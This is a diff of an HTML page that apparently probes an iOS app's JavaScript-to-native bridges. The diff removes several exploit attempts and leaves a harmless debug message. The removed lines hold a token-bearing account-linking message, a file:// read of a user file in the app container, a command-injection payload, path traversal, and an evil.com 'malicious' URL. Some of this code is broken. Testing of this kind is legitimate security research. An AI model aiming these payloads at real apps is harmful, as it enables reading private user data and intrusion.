@@ -31,71 +31,12 @@
 
   <h1>📡 Test JS -> Native Bridges (Exploit Attempt)</h1>
 
-  <button onclick="sendTargetAccountLinking()">🔗 TargetAccountLinkingInterfaceHandler (XSS)</button>
-  <button onclick="sendAmazonShop()">🛍️ AmazonShopExternalInterfaceHandler (Command Injection)</button>
-  <button onclick="sendPinImageOffScreen()">🖼️ PinImageOffScreenDetectionHandler (Path Traversal)</button>
-  <button onclick="sendPinmarkletCompletion()">📌 pinmarkletCompletionHandler (Malicious URL)</button>
+  <button onclick="sendTargetAccountLinking()">🔗 debugOutput (XSS)</button>
 
   <script>
     function sendTargetAccountLinking() {
-      try {
-        // // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
-        // window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-        // accountId: "863776540939551628",
-        // action: "accountLinked",
-        // token: "MTQzMTU5NDo4MTMzOTI1MjAxMDgxNzE2NzA6OTIyMzM3MjAzNjg1NDc3NTgwNzoxfDE3NTM2NzEzMjE6MC0tMjg0YmE0ZDE5Yjc2YjdlY2ViODAyYTc4ODc5NDNkMTg="
-        // });
-        // alert("✅ Sent XSS ");
-
-        fetch('file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser')
-        .then(response => response.text())
-        .then(text => console.log(text))
-        .alert("data " + response.text())
-        .catch(err => console.error(err));
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
+      window.webkit.messageHandlers.debugOutput.postMessage("Hello from JS");
     }
-
-    // function sendAmazonShop() {
-    //   try {
-    //     // محاولة حقن أمر (لو handler يسمح بتنفيذ أوامر)
-    //     window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage({
-    //       action: "execute",
-    //       command: "open -a Calculator"  // أو أي أمر ممكن ينفذه النيتف
-    //     });
-    //     alert("✅ Sent command injection payload to AmazonShopExternalInterfaceHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
-
-    // function sendPinImageOffScreen() {
-    //   try {
-    //     // محاولة path traversal لقراءة ملفات حساسة
-    //     window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
-    //       url: "file:///private/var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/C"
-    //     });
-    //     alert("✅ Sent path traversal payload to PinImageOffScreenDetectionHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
-
-    // function sendPinmarkletCompletion() {
-    //   try {
-    //     // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
-    //     window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
-    //       imageUrl: "https://evil.com/malicious.jpg"
-    //     });
-    //     alert("✅ Sent malicious URL payload to pinmarkletCompletionHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
-
-    
-
   </script>
 
 </body>
